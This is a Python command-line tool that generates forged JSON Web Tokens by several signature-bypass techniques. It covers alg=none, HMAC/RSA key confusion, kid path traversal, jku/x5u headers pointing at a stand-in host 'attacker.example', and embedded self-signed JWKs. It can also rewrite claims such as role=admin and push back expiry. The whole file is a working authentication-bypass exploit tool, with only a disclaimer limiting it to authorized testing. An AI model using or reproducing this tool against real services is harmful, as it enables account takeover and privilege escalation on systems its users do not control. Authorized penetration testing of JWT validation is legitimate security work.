#!/usr/bin/env python3
"""
JWT algorithm confusion payload generator.

This utility is intended for education and authorized security testing only.
Use it only against systems you own or have explicit permission to assess.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable

try:
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding, rsa

    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False


JsonObject = dict[str, Any]
HMAC_DIGESTS: dict[str, Callable[[], Any]] = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}
KEYLESS_ATTACKS = {"none", "kid", "jwk-injection", "embedded-jwk", "x5u"}


class JwtConfusionError(ValueError):
    """Raised when token processing cannot continue."""


def base64_url_decode(value: str) -> bytes:
    """Decode an unpadded base64url value."""
    padding = "=" * (-len(value) % 4)
    try:
        return base64.urlsafe_b64decode(value + padding)
    except Exception as exc:
        raise JwtConfusionError(f"Invalid base64url value: {exc}") from exc


def base64_url_encode(value: bytes) -> str:
    """Encode bytes as an unpadded base64url string."""
    return base64.urlsafe_b64encode(value).decode("ascii").rstrip("=")


def parse_jwt(token: str) -> tuple[JsonObject, JsonObject, str]:
    """Parse a compact JWT into header, payload, and signature parts."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise JwtConfusionError(f"Invalid JWT format. Expected 3 parts, got {len(parts)}")

    header_b64, payload_b64, signature = parts
    try:
        header = json.loads(base64_url_decode(header_b64).decode("utf-8"))
        payload = json.loads(base64_url_decode(payload_b64).decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise JwtConfusionError(f"JWT header or payload is not valid JSON: {exc}") from exc

    if not isinstance(header, dict) or not isinstance(payload, dict):
        raise JwtConfusionError("JWT header and payload must both be JSON objects")

    return header, payload, signature


def encode_json_part(value: JsonObject) -> str:
    """Encode a JWT JSON section using compact canonical JSON."""
    return base64_url_encode(json.dumps(value, separators=(",", ":"), sort_keys=True).encode("utf-8"))


def assemble_unsigned_token(header: JsonObject, payload: JsonObject) -> str:
    """Create the header.payload portion of a JWT."""
    return f"{encode_json_part(header)}.{encode_json_part(payload)}"


def parse_value(raw_value: str) -> Any:
    """Parse a CLI key=value string into a JSON-like Python value."""
    lowered = raw_value.lower()
    if lowered == "true":
        return True
    if lowered == "false":
        return False
    if lowered in {"null", "none"}:
        return None

    try:
        return json.loads(raw_value)
    except json.JSONDecodeError:
        return raw_value


def apply_modifications(target: JsonObject, modifications: list[str], *, allow_time_offsets: bool) -> JsonObject:
    """Apply key=value modifications to a JWT header or payload copy."""
    modified = target.copy()

    for modification in modifications:
        if "=" not in modification:
            raise JwtConfusionError(f"Invalid modification format. Use key=value: {modification}")

        key, raw_value = modification.split("=", 1)
        if not key:
            raise JwtConfusionError(f"Modification key cannot be empty: {modification}")

        if allow_time_offsets and key in {"exp", "nbf", "iat"} and raw_value[:1] in {"+", "-"}:
            try:
                offset = int(raw_value)
                current_value = int(modified.get(key, datetime.now(timezone.utc).timestamp()))
            except (TypeError, ValueError) as exc:
                raise JwtConfusionError(f"Invalid time offset for {key}: {raw_value}") from exc
            modified[key] = current_value + offset
            continue

        modified[key] = parse_value(raw_value)

    return modified


def read_key_file(key_path: str) -> bytes:
    """Read a key file as bytes."""
    try:
        return Path(key_path).read_bytes()
    except OSError as exc:
        raise JwtConfusionError(f"Error reading key file: {exc}") from exc


def generate_rsa_key_pair() -> tuple[JsonObject, bytes]:
    """Generate an RSA key pair and return public JWK plus private PEM."""
    if not CRYPTOGRAPHY_AVAILABLE:
        raise JwtConfusionError("The cryptography package is required. Install with: pip install cryptography")

    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    public_key = private_key.public_key()

    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

    numbers = public_key.public_numbers()
    exponent = numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, byteorder="big")
    modulus = numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, byteorder="big")

    jwk = {
        "kty": "RSA",
        "e": base64_url_encode(exponent),
        "n": base64_url_encode(modulus),
        "alg": "RS256",
        "kid": f"generated-{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}",
    }
    return jwk, private_pem


def sign_hmac(header: JsonObject, payload: JsonObject, key_data: bytes, algorithm: str) -> str:
    """Create an HMAC-signed JWT."""
    if algorithm not in HMAC_DIGESTS:
        raise JwtConfusionError(f"Unsupported HMAC algorithm: {algorithm}")

    header["alg"] = algorithm
    signing_input = assemble_unsigned_token(header, payload)
    signature = hmac.new(key_data, signing_input.encode("ascii"), HMAC_DIGESTS[algorithm]).digest()
    return f"{signing_input}.{base64_url_encode(signature)}"


def sign_rsa(header: JsonObject, payload: JsonObject, private_key_pem: bytes) -> str:
    """Create an RS256 JWT using a PEM private key."""
    if not CRYPTOGRAPHY_AVAILABLE:
        raise JwtConfusionError("The cryptography package is required. Install with: pip install cryptography")

    header["alg"] = "RS256"
    signing_input = assemble_unsigned_token(header, payload)
    private_key = serialization.load_pem_private_key(private_key_pem, password=None, backend=default_backend())
    signature = private_key.sign(signing_input.encode("ascii"), padding.PKCS1v15(), hashes.SHA256())
    return f"{signing_input}.{base64_url_encode(signature)}"


def none_attack(header: JsonObject, payload: JsonObject) -> str:
    """Set alg=none and return an unsigned JWT."""
    header["alg"] = "none"
    return f"{assemble_unsigned_token(header, payload)}."


def kid_attack(header: JsonObject, payload: JsonObject, kid_value: str) -> str:
    """Set a controlled kid header value and return an unsigned JWT."""
    header.setdefault("alg", "none")
    header["kid"] = kid_value
    return f"{assemble_unsigned_token(header, payload)}."


def jwk_injection_attack(header: JsonObject, payload: JsonObject, jwk_url: str, generated_jwk: JsonObject | None) -> str:
    """Add a JWK Set URL or embedded generated JWK hint to the header."""
    header["alg"] = "RS256"
    header["jku"] = jwk_url
    if generated_jwk:
        header["jwk"] = generated_jwk
    return f"{assemble_unsigned_token(header, payload)}."


def embedded_jwk_attack(header: JsonObject, payload: JsonObject) -> str:
    """Generate an RSA key pair, embed the public JWK, and sign with the private key."""
    jwk, private_key_pem = generate_rsa_key_pair()
    header["jwk"] = jwk
    return sign_rsa(header, payload, private_key_pem)


def x5u_attack(header: JsonObject, payload: JsonObject, url: str) -> str:
    """Add an x5u header pointing at a certificate URL."""
    header["alg"] = "RS256"
    header["x5u"] = url
    return f"{assemble_unsigned_token(header, payload)}."


def key_confusion_attack(header: JsonObject, payload: JsonObject, key_data: bytes) -> str:
    """Use a symmetric HMAC signature while advertising an asymmetric algorithm."""
    header["alg"] = "RS256"
    signing_input = assemble_unsigned_token(header, payload)
    signature = hmac.new(key_data, signing_input.encode("ascii"), hashlib.sha256).digest()
    return f"{signing_input}.{base64_url_encode(signature)}"


def print_key_info(key_data: bytes, verbose: bool) -> None:
    """Print basic key metadata when cryptography can parse it."""
    if not verbose or not CRYPTOGRAPHY_AVAILABLE:
        return

    key_type = "Unknown"
    try:
        public_key = serialization.load_pem_public_key(key_data, backend=default_backend())
        key_type = "Public Key"
        if isinstance(public_key, rsa.RSAPublicKey):
            numbers = public_key.public_numbers()
            print("RSA Public Key Details:")
            print(f"  Modulus (n): {numbers.n}")
            print(f"  Public Exponent (e): {numbers.e}")
    except Exception:
        try:
            private_key = serialization.load_pem_private_key(key_data, password=None, backend=default_backend())
            key_type = "Private Key"
            if isinstance(private_key, rsa.RSAPrivateKey):
                numbers = private_key.private_numbers()
                print("RSA Private Key Details:")
                print(f"  Modulus (n): {numbers.public_numbers.n}")
                print(f"  Public Exponent (e): {numbers.public_numbers.e}")
        except Exception:
            pass

    print(f"Key Type: {key_type}")
    print(f"Key Size: {len(key_data)} bytes")


def build_forged_token(args: argparse.Namespace) -> tuple[str, JsonObject, JsonObject, JsonObject, JsonObject]:
    """Build a forged JWT from parsed CLI args."""
    header, payload, _signature = parse_jwt(args.token)
    modified_payload = apply_modifications(payload, args.modify, allow_time_offsets=True)
    modified_header = apply_modifications(header, args.header, allow_time_offsets=False)

    key_data = read_key_file(args.key) if args.key else None
    if key_data:
        print_key_info(key_data, args.verbose and not args.raw_token)

    generated_jwk = None
    if args.gen_key and args.attack == "jwk-injection":
        generated_jwk, _private_key_pem = generate_rsa_key_pair()

    if args.attack == "hmac":
        forged_token = sign_hmac(modified_header, modified_payload, require_key(key_data, args.attack), args.algorithm)
    elif args.attack == "none":
        forged_token = none_attack(modified_header, modified_payload)
    elif args.attack == "kid":
        forged_token = kid_attack(modified_header, modified_payload, args.kid_value)
    elif args.attack == "jwk-injection":
        forged_token = jwk_injection_attack(modified_header, modified_payload, args.jwk_url, generated_jwk)
    elif args.attack == "embedded-jwk":
        forged_token = embedded_jwk_attack(modified_header, modified_payload)
    elif args.attack == "x5u":
        forged_token = x5u_attack(modified_header, modified_payload, args.jwk_url)
    elif args.attack == "key-confusion":
        forged_token = key_confusion_attack(modified_header, modified_payload, require_key(key_data, args.attack))
    else:
        raise JwtConfusionError(f"Unsupported attack: {args.attack}")

    return forged_token, header, payload, modified_header, modified_payload


def require_key(key_data: bytes | None, attack: str) -> bytes:
    """Return key bytes or raise a clear error."""
    if key_data is None:
        raise JwtConfusionError(f"A key file is required for the {attack} attack")
    return key_data


def read_token(args: argparse.Namespace, parser: argparse.ArgumentParser) -> str:
    """Read token text from --token or --file."""
    if args.token:
        return args.token.strip()
    if args.file:
        try:
            return Path(args.file).read_text(encoding="utf-8").strip()
        except OSError as exc:
            parser.error(f"Error reading token from file: {exc}")
    parser.error("No token provided. Use --token or --file")


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    """Parse and validate command-line arguments."""
    parser = argparse.ArgumentParser(
        description="JWT algorithm confusion payload generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python jwt_confusion.py --token <jwt> --key public.pem
  python jwt_confusion.py --token <jwt> --attack none
  python jwt_confusion.py --token <jwt> --attack kid --kid-value ../../../../../dev/null
  python jwt_confusion.py --token <jwt> --attack embedded-jwk
  python jwt_confusion.py --file token.txt --key public.pem -m role=admin -m exp=+3600
""",
    )
    parser.add_argument("--token", "-t", help="JWT token to modify")
    parser.add_argument("--file", "-f", help="Read token from a file")
    parser.add_argument("--key", "-k", help="Key file used as signing material for key-based attacks")
    parser.add_argument("--algorithm", "-a", default="HS256", choices=sorted(HMAC_DIGESTS), help="HMAC algorithm for hmac attack")
    parser.add_argument(
        "--attack",
        default="hmac",
        choices=["hmac", "none", "kid", "jwk-injection", "embedded-jwk", "x5u", "key-confusion"],
        help="Payload generation technique to use",
    )
    parser.add_argument("--modify", "-m", action="append", default=[], help="Modify payload field as key=value")
    parser.add_argument("--header", action="append", default=[], help="Modify header field as key=value")
    parser.add_argument("--kid-value", default="../../../../../dev/null", help="kid value for the kid attack")
    parser.add_argument("--jwk-url", default="https://attacker.example/jwks.json", help="URL for jku or x5u header attacks")
    parser.add_argument("--gen-key", action="store_true", help="Generate and embed a public JWK for jwk-injection")
    parser.add_argument("--raw-token", action="store_true", help="Print only the generated token")
    parser.add_argument("--verbose", "-v", action="store_true", help="Print decoded token details")
    parser.add_argument("--print-decoded", "-p", action="store_true", help="Print decoded original token and exit")
    parser.add_argument("--output", "-o", help="Write generated token to a file")

    args = parser.parse_args(argv)
    args.token = read_token(args, parser)

    if args.attack not in KEYLESS_ATTACKS and not args.key and not args.print_decoded:
        parser.error(f"--key is required for the {args.attack} attack")
    if args.attack != "jwk-injection" and args.gen_key:
        parser.error("--gen-key is only used with --attack jwk-injection")

    return args


def print_decoded_token(token: str) -> None:
    """Print decoded JWT header and payload."""
    header, payload, _signature = parse_jwt(token)
    print("Decoded Header:")
    print(json.dumps(header, indent=2, sort_keys=True))
    print("\nDecoded Payload:")
    print(json.dumps(payload, indent=2, sort_keys=True))


def write_output(token: str, output_path: str | None, raw_token: bool) -> None:
    """Write a token to the requested destination."""
    if output_path:
        try:
            Path(output_path).write_text(token, encoding="utf-8")
        except OSError as exc:
            raise JwtConfusionError(f"Error writing output file: {exc}") from exc
        if not raw_token:
            print(f"Generated token written to {output_path}")
        return

    if raw_token:
        print(token)
    else:
        print("\nGenerated Token:")
        print(token)


def main(argv: list[str] | None = None) -> int:
    """CLI entry point."""
    try:
        args = parse_args(argv)

        if args.print_decoded:
            print_decoded_token(args.token)
            return 0

        forged_token, header, payload, modified_header, modified_payload = build_forged_token(args)

        if args.verbose and not args.raw_token:
            print("\nOriginal Header:")
            print(json.dumps(header, indent=2, sort_keys=True))
            print("\nOriginal Payload:")
            print(json.dumps(payload, indent=2, sort_keys=True))
            print(f"\nOriginal Algorithm: {header.get('alg', 'none')}")
            if header != modified_header:
                print("\nModified Header:")
                print(json.dumps(modified_header, indent=2, sort_keys=True))
            if payload != modified_payload:
                print("\nModified Payload:")
                print(json.dumps(modified_payload, indent=2, sort_keys=True))

        write_output(forged_token, args.output, args.raw_token)
        return 0
    except JwtConfusionError as exc:
        print(f"Error: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
